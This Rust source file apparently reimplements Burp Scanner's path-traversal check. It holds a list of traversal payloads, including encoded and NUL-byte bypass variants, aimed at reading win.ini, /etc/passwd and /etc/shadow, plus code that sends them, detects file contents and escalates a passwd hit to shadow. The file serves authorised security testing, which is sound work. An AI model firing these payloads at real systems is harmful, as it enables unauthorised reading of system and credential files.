// Split from scan.rs (L5, issue #35). Bodies unchanged; visibility promoted
// to pub(crate) where siblings across the split need access.

/// burp.Zsv7: audit speed. A payload is used when configured >= payload tier
/// (Zsv7.Zi). Set in Settings > Scanner > Audit speed (`Shared::scan_speed`).
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
pub enum ScanSpeed {
    Fast,
    Normal,
    Thorough,
}

impl ScanSpeed {
    pub(crate) fn from_u8(v: u8) -> Self {
        match v {
            0 => ScanSpeed::Fast,
            2 => ScanSpeed::Thorough,
            _ => ScanSpeed::Normal,
        }
    }
}

pub const OS_WINDOWS: u8 = 0;

pub const OS_UNIX: u8 = 1;

/// burp.Zco6: FILENAME_WINDOWS, FILENAME_PASSWD_UNIX, FILENAME_SHADOW_UNIX.
pub const TRAV_FILENAMES: [&str; 3] = ["win.ini", "passwd", "shadow"];

/// burp.Zw_c.ZE: per-OS file-content markers. Burp stores them upper-cased
/// in byte tries, i.e. the match is ASCII case-insensitive.
pub const FILE_MARKERS: [&[&str]; 2] = [
    &[
        "; FOR 16-BIT APP SUPPORT",
        "[FONTS]",
        "[EXTENSIONS]",
        "[MCI EXTENSIONS]",
        "[FILES]",
    ],
    &["ROOT:", "BIN:", "NOBODY:"],
];

/// burp.Zhcu row: os (Zg), placement (Ze: 0 = replace the value, 1 = value +
/// payload, 2 = payload + NUL + value), tier (ZY), text (ZH). Chars
/// U+0080..U+00FF stand for single raw bytes (Burp encodes with ISO-8859-1).
pub struct TravPayload {
    os: u8,
    placement: u8,
    speed: ScanSpeed,
    text: &'static str,
}

pub const fn tp(os: u8, placement: u8, speed: ScanSpeed, text: &'static str) -> TravPayload {
    TravPayload {
        os,
        placement,
        speed,
        text,
    }
}

/// burp.Zscp.ZL, in Burp's order.
pub const TRAVERSAL_PAYLOADS: &[TravPayload] = {
    use ScanSpeed::*;
    &[
        tp(0, 0, Fast, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        tp(0, 0, Normal, "c:\\windows\\win.ini"),
        tp(0, 0, Thorough, "../../../../../../../../../../../../../../../../windows/win.ini"),
        tp(0, 0, Thorough, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini"),
        tp(0, 0, Thorough, "../../../../../../../../../../../../../../../../winnt/win.ini"),
        tp(0, 0, Thorough, "\\windows\\win.ini"),
        tp(0, 0, Thorough, "file:///c:/windows/win.ini"),
        tp(0, 0, Thorough, "...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini"),
        tp(0, 0, Thorough, ".../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini"),
        tp(0, 0, Thorough, "...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini"),
        tp(0, 0, Thorough, "\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{9c}windows\u{c0}\u{9c}win.ini"),
        tp(0, 0, Thorough, "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"),
        tp(0, 1, Fast, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        tp(0, 1, Thorough, "../../../../../../../../../../../../../../../../windows/win.ini"),
        tp(0, 1, Thorough, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini"),
        tp(0, 1, Thorough, "../../../../../../../../../../../../../../../../winnt/win.ini"),
        tp(0, 2, Normal, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        tp(0, 2, Thorough, "c:\\windows\\win.ini"),
        tp(0, 2, Thorough, "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini"),
        tp(1, 0, Fast, "../../../../../../../../../../../../../../../../etc/passwd"),
        tp(1, 0, Normal, "/etc/passwd"),
        tp(1, 0, Thorough, "file:///etc/passwd"),
        tp(1, 0, Thorough, "..././..././..././..././..././..././..././..././..././..././etc/passwd"),
        tp(1, 0, Thorough, "\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}\u{c0}\u{ae}\u{c0}\u{ae}\u{c0}\u{af}etc\u{c0}\u{af}passwd"),
        tp(1, 0, Thorough, "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        tp(1, 1, Fast, "../../../../../../../../../../../../../../../../etc/passwd"),
        tp(1, 2, Normal, "../../../../../../../../../../../../../../../../etc/passwd"),
    ]
};

/// burp.Zp3a.Zf: the effective tier. THOROUGH when configured so, when the
/// base value is empty, or when it looks like a path (Zp3a.ZJ).
pub fn traversal_speed(configured: ScanSpeed, value: &str) -> ScanSpeed {
    use std::sync::OnceLock;
    static PATHLIKE: OnceLock<regex::Regex> = OnceLock::new();
    if configured == ScanSpeed::Thorough || value.is_empty() {
        return ScanSpeed::Thorough;
    }
    let re = PATHLIKE
        .get_or_init(|| regex::Regex::new(r"^([ -.0-\[\]-~]*[\\/.][ -.0-\[\]-~]+)+$").unwrap());
    if re.is_match(value) {
        ScanSpeed::Thorough
    } else {
        configured
    }
}

/// burp.Zscp.Za: placement-0 payloads, then value + placement-1 payloads,
/// then placement-2 payloads + NUL + value.
pub fn traversal_candidates(value: &str, os: u8, speed: ScanSpeed) -> Vec<String> {
    let pick = |placement: u8| {
        TRAVERSAL_PAYLOADS
            .iter()
            .filter(move |p| p.os == os && p.placement == placement && speed >= p.speed)
            .map(|p| p.text)
    };
    let mut out: Vec<String> = pick(0).map(str::to_string).collect();
    out.extend(pick(1).map(|p| format!("{value}{p}")));
    out.extend(pick(2).map(|p| format!("{p}\u{0}{value}")));
    out
}

/// burp.Zw_c constructor: markers already present in the baseline response
/// are disabled, so a page that always says "[FILES]" never reports.
pub fn file_marker_baseline(baseline: &str, os: u8) -> Vec<bool> {
    let up = baseline.to_ascii_uppercase();
    FILE_MARKERS[os as usize]
        .iter()
        .map(|m| up.contains(m))
        .collect()
}

/// burp.Zw_c.ZN: the enabled markers for `os` found in `body`.
pub fn file_marker_hits(body: &str, os: u8, suppressed: &[bool]) -> Vec<&'static str> {
    let up = body.to_ascii_uppercase();
    FILE_MARKERS[os as usize]
        .iter()
        .enumerate()
        .filter(|(i, m)| !suppressed.get(*i).copied().unwrap_or(false) && up.contains(*m))
        .map(|(_, m)| *m)
        .collect()
}

/// burp.Zp3a.Zd/ZG: the negative control. The first known filename in the
/// payload gets an `X` appended (passwd -> passwdX); otherwise `X` is appended.
pub fn traversal_control(payload: &str) -> String {
    match TRAV_FILENAMES.iter().find(|f| payload.contains(*f)) {
        Some(f) => payload.replace(f, &format!("{f}X")),
        None => format!("{payload}X"),
    }
}

/// Encode a payload for a URL query insertion point: chars outside
/// printable ASCII are Burp's ISO-8859-1 bytes, sent percent-encoded, as are
/// the delimiters that would otherwise split the request line or the query.
pub fn encode_query_payload(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        let b = c as u32;
        if b <= 0x20 || b >= 0x7f || matches!(c, '&' | '#') {
            out.push_str(&format!("%{:02X}", b & 0xff));
        } else {
            out.push(c);
        }
    }
    out
}

pub struct FileReadHit {
    pub payload: String,
    pub file: &'static str,
    pub markers: Vec<&'static str>,
}

/// burp.Zp3a.ZF/ZM/Zg/ZS: try Windows then Unix candidates; a candidate hits
/// when enabled markers appear AND its `X` control shows none (ZV). A Unix
/// passwd hit is escalated to shadow (Zg); the shadow hit wins if it confirms.
/// `send` returns the response body for a raw (unencoded) payload value.
pub fn run_traversal_check<F: FnMut(&str) -> Option<String>>(
    value: &str,
    baseline: &str,
    configured: ScanSpeed,
    mut send: F,
) -> Option<FileReadHit> {
    let speed = traversal_speed(configured, value);
    let probe = |payload: &str, os: u8, send: &mut F| -> Option<Vec<&'static str>> {
        let suppressed = file_marker_baseline(baseline, os);
        let markers = file_marker_hits(&send(payload)?, os, &suppressed);
        if markers.is_empty() {
            return None;
        }
        let control = send(&traversal_control(payload)).unwrap_or_default();
        if !file_marker_hits(&control, os, &suppressed).is_empty() {
            return None; // markers regardless of filename: not a file read
        }
        Some(markers)
    };
    for os in [OS_WINDOWS, OS_UNIX] {
        for cand in traversal_candidates(value, os, speed) {
            let Some(markers) = probe(&cand, os, &mut send) else {
                continue;
            };
            if os == OS_UNIX {
                let shadow = cand.replace("passwd", "shadow");
                if let Some(m2) = probe(&shadow, OS_UNIX, &mut send) {
                    return Some(FileReadHit {
                        payload: shadow,
                        file: "/etc/shadow",
                        markers: m2,
                    });
                }
            }
            let file = if os == OS_WINDOWS {
                "win.ini"
            } else {
                "/etc/passwd"
            };
            return Some(FileReadHit {
                payload: cand,
                file,
                markers,
            });
        }
    }
    None
}
